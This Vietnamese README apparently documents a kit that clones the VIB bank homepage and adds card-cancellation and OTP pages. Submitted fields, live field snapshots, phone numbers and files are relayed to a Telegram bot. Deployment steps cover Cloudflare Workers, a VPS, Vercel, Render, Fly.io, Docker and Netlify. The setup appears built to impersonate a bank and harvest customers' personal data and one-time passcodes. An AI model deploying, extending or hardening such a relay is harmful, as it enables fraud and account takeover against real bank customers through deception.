# VIB Landing (Hợp nhất)

## Tóm tắt
Dự án là bản hợp nhất và tinh gọn các phiên bản trang chủ (`full-homepage.html`, `vib-homepage.html`) thành một trang trung tâm `index.html` sử dụng stylesheet duy nhất `main.css` và script chức năng `full-homepage.js` + dữ liệu tách riêng trong `data.js`.

## Cấu trúc chính
```
index.html            # Trang hợp nhất
main.css              # Hệ thống style chuẩn hóa (tokens + components + responsive)
full-homepage.js      # Logic carousel, tabs, menu, search, back-to-top (đã nâng cấp swipe & pause)
data.js               # Nguồn dữ liệu có thể hydrate động (promotions, news, tabs)
assets/               # Hình ảnh banner & logo
(full-homepage.html, vib-homepage.html) # Giữ lại tham chiếu, không còn dùng trực tiếp
```

## Tính năng hiện tại
- Mega menu + mobile toggle (hamburger) với hỗ trợ keyboard cơ bản.
- Carousel hero 4 slide:
  - Tự động chuyển (5s), hiệu ứng fade.
  - Pause khi hover, focus, hoặc khi tab trình duyệt ẩn (visibility change).
  - Điều khiển bằng nút Prev/Next, chấm (dots) và phím mũi tên.
  - Hỗ trợ vuốt ngang (touch swipe threshold 40px).
  - Progress bar hiển thị thời gian slide.
- Khối ưu đãi, tabs sản phẩm, tin tức.
- Hydrate dữ liệu động cho promotions & news qua `data.js` (có thể mở rộng tabs / carousel sau).
- Responsive đa breakpoint: ≥1200, <992, <768, <600, <480.
- Nút Back-to-top hiển thị khi cuộn xuống.

## Chạy thử
Chỉ cần mở trực tiếp `index.html` trong trình duyệt (không phụ thuộc build tool). Để đảm bảo import module (ESM) hoạt động ổn định trên mọi trình duyệt, khuyến nghị chạy qua một static server nhẹ:

PowerShell:
```pwsh
# Python 3
python -m http.server 8080
# hoặc Node (npx serve nếu đã cài)
npx serve .
```
Truy cập: http://localhost:8080

## Triển khai Cloudflare Worker (Telegram Relay + OTP)

### Cấu trúc mới
```
worker.js        # Cloudflare Worker implement relay + OTP
wrangler.toml    # Cấu hình triển khai
```

### Bước 1: Cài Wrangler
```pwsh
npm install -g wrangler
```

### Bước 2: Tạo KV Namespace
```pwsh
wrangler kv namespace create APP_KV --env production
wrangler kv namespace create APP_KV --env preview
```
Copy `id` & `preview_id` vào `wrangler.toml` (thay placeholder).

### Bước 3: Thiết lập secrets
```pwsh
wrangler secret put BOT_TOKEN      # token bot Telegram (không commit)
wrangler secret put CHAT_ID        # ví dụ: -1001234567890 (chat/channel id numeric)
wrangler secret put HMAC_KEY       # khóa bí mật HMAC (nếu bật REQUIRE_HMAC)
```

### Bước 4: (Tuỳ chọn) Bật cờ môi trường trong `wrangler.toml`
Ví dụ bật HMAC & chế độ debug OTP trong dev:
```toml
[vars]
REQUIRE_HMAC = "1"
DEBUG_RETURN_OTP = "1"
DEV_ALLOW_ENVINFO = "1"
```

### Bước 5: Deploy
```pwsh
wrangler deploy
```
Kết quả: xuất URL public, ví dụ `https://vib-relay.your-account.workers.dev`.

### Bước 6: Trỏ frontend
Trong trang form chính đặt:
```html
<script>
  window.TG_PROXY_URL = 'https://vib-relay.your-account.workers.dev';
</script>
```

### Endpoint chính
| Endpoint | Method | Mô tả |
|----------|--------|-------|
| /form/submit-init | POST | Khởi tạo, sinh requestId + OTP (server lưu) |
| /otp/request | POST | Gửi lại OTP (rate-limit) |
| /otp/verify | POST | Xác thực OTP, gửi summary Telegram (nếu kèm) |
| /tele/sendMessage | POST | Gửi message đơn lẻ (field, snapshot, audit) |
| /tele/sendDocument | POST | Upload file đính kèm |

### Payload ví dụ
Submit init:
```json
{
  "summary": "...markdown...",
  "phone": "+84901234567",
  "reason": "Nghi ngờ giao dịch",
  "meta": { "duration":24, "mode":"now" }
}
```

Verify OTP:
```json
{ "requestId": "REQ-abc123", "otp": "123456", "summary": "(optional final summary)" }
```

### HMAC (nếu bật)
Headers yêu cầu:
```
X-Signature: v1=<hexsha256>
X-Timestamp: <unix seconds>
X-Nonce: <random>
```
String ký:
```
METHOD\nPATH\nTIMESTAMP\nNONCE\nBODY_RAW
```

### Lưu ý bảo mật
1. Không trả OTP thật về client trong production (tắt DEBUG_RETURN_OTP, DEMO_STATIC_OTP).
2. Không log mã OTP đầy đủ vào Telegram (đã mask ở frontend audit).
3. Xoay HMAC_KEY định kỳ (thêm HMAC_KEY_NEXT nếu cần dual verify).
4. Token bot Telegram phải là secret (Wrangler secret). Không commit.

### Kế hoạch tích hợp tiếp theo
1. Chỉnh `huy-tam-khoa-the.html` dùng `fetch('/form/submit-init')` thay vì lưu local summary & redirect thẳng.
2. Sửa `otphtml1.html` để gọi `/otp/verify` thay vì mã cứng 123456.
3. Thêm hàm ký HMAC (nếu bật) trước mỗi request.
4. Giảm tần suất gửi field realtime nếu đụng rate-limit.

---
Nếu cần ví dụ hàm ký HMAC trong frontend, hoặc tích hợp thực tế 2 trang form & OTP theo spec, tạo yêu cầu tiếp và mình sẽ cập nhật.

## Triển khai trên VPS (Ubuntu/Debian) – Phương án thay thế Cloudflare Worker

Khi bạn muốn tự host (ví dụ cần private network, tuỳ biến Redis, logging sâu) có thể dùng server Node/Express (`server.js`).

### 1. Chuẩn bị hệ thống
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y curl git ufw redis-server nginx
```

### 2. Cài Node.js (>=18)
```bash
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs
node -v
```

### 3. Cấu hình Redis (cơ bản)
```
/etc/redis/redis.conf:
  supervised systemd
  bind 127.0.0.1 ::1
  protected-mode yes
systemctl restart redis-server
systemctl enable redis-server
```
Kiểm tra: `redis-cli ping` -> PONG

### 4. Clone mã nguồn lên VPS
```bash
git clone <repo-url> vib-app
cd vib-app
npm install
```

### 5. Tạo file `.env`
```
PORT=3000
BOT_TOKEN=xxxxxxxx:yyyyyyyyyyyyyyyy
CHAT_ID=-1001234567890
HMAC_KEY=super_secret_64_bytes_or_more
REQUIRE_HMAC=1
REDIS_URL=redis://localhost:6379
# DEBUG_RETURN_OTP=1
# DEMO_STATIC_OTP=1
# DEV_ALLOW_ENVINFO=1
```

### 6. Test thủ công
```bash
npm start
curl -X POST http://localhost:3000/form/submit-init \
  -H 'Content-Type: application/json' \
  -d '{"summary":"Test deploy","phone":"0901234567"}'
```

### 7. Tạo service systemd
`/etc/systemd/system/vib-relay.service`
```
[Unit]
Description=VIB Relay API
After=network.target redis-server.service

[Service]
Type=simple
WorkingDirectory=/opt/vib-app
Environment=NODE_ENV=production
EnvironmentFile=/opt/vib-app/.env
ExecStart=/usr/bin/node server.js
Restart=on-failure
RestartSec=5
User=www-data
Group=www-data

[Install]
WantedBy=multi-user.target
```
```bash
sudo mv vib-app /opt/
sudo chown -R www-data:www-data /opt/vib-app
sudo systemctl daemon-reload
sudo systemctl enable vib-relay
sudo systemctl start vib-relay
sudo systemctl status vib-relay
```

### 8. Reverse proxy Nginx + TLS
`/etc/nginx/sites-available/vib-relay.conf`
```
server {
  server_name api.example.com;
  listen 80;
  location / {
    proxy_pass http://127.0.0.1:3000;
    proxy_set_header Host $host;
    proxy_set_header X-Real-IP $remote_addr;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header X-Forwarded-Proto $scheme;
  }
}
```
```bash
sudo ln -s /etc/nginx/sites-available/vib-relay.conf /etc/nginx/sites-enabled/
sudo nginx -t
sudo systemctl reload nginx
```
Thêm TLS (Let's Encrypt):
```bash
sudo apt install -y certbot python3-certbot-nginx
sudo certbot --nginx -d api.example.com --redirect -m you@example.com --agree-tos
```

### 9. Firewall căn bản (UFW)
```bash
sudo ufw allow OpenSSH
sudo ufw allow 'Nginx Full'
sudo ufw enable
sudo ufw status
```

### 10. Triển khai frontend tĩnh
Các file HTML/CSS/JS có thể:
1) Host chung Nginx: `root /opt/vib-app/;` (thêm server block khác `static.example.com`)
2) Dùng CDN/Static hosting (Cloudflare Pages, Netlify) và cấu hình `window.API_BASE='https://api.example.com'`.

### 11. HMAC ký trên frontend (phác thảo)
```js
async function hmacSign(method, path, bodyObj, secret){
  const body = bodyObj ? JSON.stringify(bodyObj) : '';
  const ts = Math.floor(Date.now()/1000);
  const nonce = crypto.randomUUID();
  const msg = `${method}\n${path}\n${ts}\n${nonce}\n${body}`;
  const key = await crypto.subtle.importKey('raw', new TextEncoder().encode(secret), {name:'HMAC', hash:'SHA-256'}, false, ['sign']);
  const sigBuf = await crypto.subtle.sign('HMAC', key, new TextEncoder().encode(msg));
  const hex = [...new Uint8Array(sigBuf)].map(b=>b.toString(16).padStart(2,'0')).join('');
  return { headers:{ 'X-Signature': 'v1='+hex, 'X-Timestamp': ts, 'X-Nonce': nonce }, body };
}
```
(Không nhúng `secret` vào frontend thực; chỉ dùng khi bạn có mô hình client tin cậy nội bộ. Public web nên chỉ bật HMAC nếu có backend trung gian hoặc token tạm thời.)

### 12. Hardening khuyến nghị
1. Bật fail2ban (SSH, Nginx).  
2. Giới hạn size body Nginx (`client_max_body_size 5M;`).  
3. Nhật ký tách riêng `/var/log/vib-relay/` (stdout systemd đủ cho MVP).  
4. Xoay HMAC_KEY định kỳ: hỗ trợ biến `HMAC_KEY_NEXT` và chấp nhận song song 2 khóa trong code.  
5. Thiết lập giám sát (Uptime Kuma/Prometheus) endpoint `/health`.  
6. Bật auto-security-updates (`unattended-upgrades`).

### 13. Backup & Khôi phục nhanh
Sao lưu: `.env`, git commit hash, Redis RDB/AOF (`/var/lib/redis`). Có thể rsync định kỳ hoặc snapshot VPS.

### 14. So sánh Worker vs VPS
| Tiêu chí | Worker | VPS |
|---------|--------|-----|
| Độ trễ global | Rất thấp (edge) | Phụ thuộc DC | 
| Bảo trì hạ tầng | Tối thiểu | Tự quản lý patch | 
| Tùy biến native libs | Hạn chế | Toàn quyền | 
| Chi phí nhỏ lưu lượng | Rẻ / miễn phí mức đầu | Có thể cao hơn | 
| KV/Redis | KV built-in | Cần cài Redis | 

---
Sau khi triển khai VPS xong, cập nhật frontend trỏ `API_BASE` tới domain API mới. Nếu cần mình có thể tạo script build / tự động sync.


## Mở rộng gợi ý
1. Lazy load hình nền carousel: thêm `loading="lazy"` cho ảnh phụ hoặc chuyển sang background prefetch.
2. Thêm `prefers-reduced-motion` để tắt tự động chuyển slide khi người dùng chọn giảm chuyển động.
3. Chuyển navigation thành SPA nhẹ (scroll spy + hash routing).
4. Tách logic carousel ra file riêng `carousel.js` để tái sử dụng.
5. Bổ sung test accessibility nhanh bằng axe-core (nếu tích hợp bundler sau này).

## Dọn dẹp / Legacy
- `full-homepage.css` và `vib-homepage.css` giữ nguyên để đối chiếu; có thể xóa nếu đã xác nhận không cần rollback.
- `new-index.html`, `vib-homepage-replica.html` (nếu có) có thể đánh dấu deprecated.

## Cách bật hydrate đầy đủ tabs
Mặc định chỉ promotions + news. Để tabs lấy dữ liệu từ `data.js`, có thể thêm hàm dựng động mới hoặc sửa code tabs trong `full-homepage.js` đọc từ `tabs` export.

## License
Nội dung hình ảnh thuộc về chủ sở hữu tương ứng (placeholder demo). Mã nguồn phần khung HTML/CSS/JS: dùng tự do trong nội bộ.

---
Nếu cần thêm tính năng (router, dark mode, bundler) hoặc tối ưu performance (thêm critical CSS, preconnect), tạo issue/nhiệm vụ tiếp theo.

## Triển khai nhanh các nền tảng phổ biến

### 1. Cloudflare Workers (đã mô tả ở trên)
Phù hợp khi chỉ cần API relay + OTP không state phức tạp. Có thể kết hợp Cloudflare Pages cho frontend tĩnh.

### 2. Cloudflare Pages + Worker (Full Stack Lightweight)
Flow:
1. Đưa toàn bộ file tĩnh (HTML/CSS/JS/assets) vào repo GitHub.
2. Tạo dự án Cloudflare Pages, chọn `Framework preset: None`.
3. Build command: để trống, Output directory: `.` (hoặc `public` nếu bạn tách). 
4. Sau khi Pages deploy, vào tab "Functions" nếu muốn sử dụng Worker tương tự `worker.js` (Pages Functions / _worker.js) hoặc cấu hình route trỏ Worker `vib-relay` tới path `/api/*`.
5. Frontend gọi: `https://<project>.pages.dev` và API dùng subpath Worker hoặc domain riêng.

Mapping đơn giản nếu muốn tách API dưới `/api`:
```
Route: yourdomain.com/api/*  --> Worker vib-relay
```
Lúc này client fetch `/api/form/submit-init`.

### 3. Vercel (Node server hoặc Edge Function)
Phương án A (dùng `server.js`):
1. Tạo `vercel.json` (nếu chưa có) chỉ định runtime Node 18.
2. Đổi tên `server.js` thành `api/index.js` nếu muốn auto route (hoặc tạo handler riêng).
3. Đặt env trên Vercel Dashboard: `BOT_TOKEN`, `CHAT_ID`, `HMAC_KEY`, tuỳ chọn `REQUIRE_HMAC=1`.
4. Deploy bằng CLI:
```pwsh
npm i -g vercel
vercel
```
Nhược: Redis không built-in -> dùng Upstash hoặc Vercel KV (Edge) thay Redis. Cần chỉnh code để optional Upstash REST.

Phương án B (Edge): Chuyển logic sang 1 file module export default function (fetch) giống `worker.js` -> phù hợp Edge Runtime. Khi đó không dùng Redis; dùng Vercel KV / Upstash.

### 4. Render.com (Web Service)
1. Tạo Web Service, repo GitHub.
2. Environment: Node 18. Build Command: `npm install` (nếu cần). Start Command: `node server.js`.
3. Thiết lập env vars. Nếu muốn Redis -> tạo dịch vụ Redis trong Render và lấy URL -> `REDIS_URL`.
4. Enable auto deploy on push.
5. Dùng Custom domain.

### 5. Fly.io (Nhẹ + Global Anycast)
1. Cài flyctl: `iwr https://fly.io/install.ps1 -UseBasicParsing | iex`
2. `fly launch` (Chọn Node, tạo `Dockerfile` tự động) hoặc viết Dockerfile thủ công.
3. Set secrets: `fly secrets set BOT_TOKEN=... CHAT_ID=... HMAC_KEY=...`.
4. Scale regions nếu cần: `fly regions add sin hkg syd`.
5. Nếu cần Redis -> Upstash add-on hoặc self-host ephemeral.

### 6. Docker + VPS bất kỳ
Tạo `Dockerfile`:
```Dockerfile
FROM node:20-alpine
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production
COPY . .
EXPOSE 3000
CMD ["node","server.js"]
```
Build & run:
```pwsh
docker build -t vib-relay .
docker run -d --name vib-relay -p 3000:3000 --env-file .env vib-relay
```
Kết hợp reverse proxy (Traefik/Nginx) hoặc dùng Docker Compose.

### 7. PM2 quản lý tiến trình (tuỳ chọn thay systemd)
```pwsh
npm i -g pm2
pm2 start server.js --name vib-relay
pm2 save
pm2 startup  # sinh lệnh thêm để auto-start
```

## Gợi ý tối ưu & Bổ sung
1. Rate Limit chính xác hơn: thay per-IP đơn giản bằng token bucket Redis (script Lua) hoặc Cloudflare Turnstile trước /form.
2. Logging cấu trúc: gửi JSON tới Loki hoặc sử dụng Cloudflare Logpush khi ở Workers.
3. Dual HMAC key rollout: chấp nhận `HMAC_KEY` và `HMAC_KEY_NEXT` -> nếu check fail với key1 thử key2 -> giúp xoay khóa không downtime.
4. Content Security Policy (CSP) cho frontend: hạn chế `script-src 'self'` tránh XSS ăn cắp OTP.
5. Thêm `X-Request-Id` header mỗi response để trace (client gửi hoặc server sinh) -> log vào Telegram audit.
6. Ẩn debug flags tự động khi `NODE_ENV=production` (thêm guard trong code).
7. Build nhỏ lại: tách phần OTP logic thành module dùng chung giữa `worker.js` và `server.js` để tránh drift.
8. Thêm test contract: file nhỏ dùng `node:test` hoặc `vitest` kiểm tra HMAC verify và OTP lifecycle.
9. Cache headers cho assets: `cache-control: public,max-age=31536000,immutable` đối với ảnh banner (đổi tên file khi thay đổi).
10. Tối ưu bảo mật Telegram: cân nhắc dùng 2 bot: 1 bot audit nội bộ (private chat), 1 bot nhận summary khách gửi, tách rủi ro.

## Kịch bản chọn nền tảng
| Nhu cầu | Khuyến nghị |
|---------|-------------|
| Chỉ cần API nhỏ + global | Cloudflare Worker |
| Cần Redis thực / lib native | VPS / Fly.io |
| Muốn zero-devops + web tĩnh + API | Cloudflare Pages + Worker |
| Dự kiến mở rộng microservices | Render / Fly.io + Docker |
| Edge + KV thấp latency | Workers |

### 8. Netlify (API + Static cùng domain)
Đã thêm: `netlify.toml` + function `netlify/functions/relay.mjs`.

Chức năng hỗ trợ: /form/submit-init, /otp/request, /otp/verify, /tele/sendMessage, /health, /_envinfo.
`/tele/sendDocument` hiện trả 501 (chưa hỗ trợ multipart trong bản rút gọn). Có thể nâng cấp dùng `busboy` hoặc `undici` FormData + binary parsing.

#### Bước 1: Cài CLI
```pwsh
npm install -g netlify-cli
```

#### Bước 2: Đăng nhập
```pwsh
netlify login
```

#### Bước 3: Khởi tạo (nếu chưa liên kết site)
```pwsh
netlify init  # chọn team, tạo site mới hoặc gắn site có sẵn
```

#### Bước 4: Thiết lập biến môi trường
```pwsh
netlify env:set BOT_TOKEN xxxxxx:yyyyyyyyyyyy
netlify env:set CHAT_ID -1001234567890
netlify env:set HMAC_KEY super_secret_key
netlify env:set REQUIRE_HMAC 1          # (tuỳ chọn)
# netlify env:set DEBUG_RETURN_OTP 1    # chỉ DEV
# netlify env:set DEMO_STATIC_OTP 1     # chỉ DEMO
# netlify env:set DEV_ALLOW_ENVINFO 1   # chỉ DEV
```

#### Bước 5: Deploy thử (draft)
```pwsh
netlify deploy --build --draft
```
Sau khi hiện URL preview, test:
```pwsh
curl -X GET  <preview-url>/health
curl -X POST <preview-url>/form/submit-init -H "Content-Type: application/json" -d '{"summary":"Test Netlify","phone":"0901234567"}'
```

#### Bước 6: Deploy production
```pwsh
netlify deploy --prod
```

#### Cấu hình routing
`netlify.toml` đã map tất cả `/form/*`, `/otp/*`, `/tele/*`, `/health` vào function `relay`. File tĩnh (HTML/CSS/JS) vẫn phục vụ trực tiếp từ root.

#### Hạn chế & Nâng cấp
1. Upload file: cần thêm multipart parser -> tạo function riêng hoặc mở rộng `relay.mjs`.
2. Redis: Netlify Functions không có Redis nội bộ; dùng Upstash (REST) hoặc chấp nhận in-memory (không bền). Có thể: `REDIS_URL=rediss://:<pass>@<host>:<port>`.
3. Cold start: OTP lưu in-memory sẽ mất khi container bị tái khởi; production khuyến nghị Redis/Upstash.

#### Thêm upload (định hướng)
Sử dụng `busboy` hoặc `@fastify/busboy`, parse event.body (base64) -> tạo FormData -> gọi Telegram API. Cần bật `binary_media_types` (Netlify tự xử lý) và đảm bảo gửi `Content-Type: multipart/form-data; boundary=...`.

#### Dọn dẹp
Nếu dùng song song Worker/Vercel, đảm bảo frontend chọn chính xác base URL (ví dụ `window.API_BASE = location.origin`).

## Checklist triển khai Production (Nhanh)
1. Tắt `DEBUG_RETURN_OTP`, `DEMO_STATIC_OTP`.
2. Bật `REQUIRE_HMAC=1` (nếu có backend ký) — nếu public web không có backend trung gian thì cân nhắc thay bằng rate-limit + captcha.
3. Redis hoặc KV sạch trước go-live (xóa entries test).
4. Test 3 vòng: init -> resend -> verify (sai 5 lần -> khoá -> sau đó đúng) bảo đảm hành vi.
5. Giám sát `/health` (HTTP 200 <300ms trung bình).
6. Kiểm tra Telegram bot quyền, chat id đúng.
7. Backup `.env` và ghi lại commit hash deploy.
8. Thiết lập cảnh báo latency >1s hoặc lỗi 5xx >2% trong 5 phút.

---
Nếu bạn muốn mình tạo thêm `Dockerfile`, `vercel.json`, hoặc script ký HMAC chuẩn cho frontend nội bộ, phản hồi yêu cầu tiếp và mình sẽ bổ sung trực tiếp.
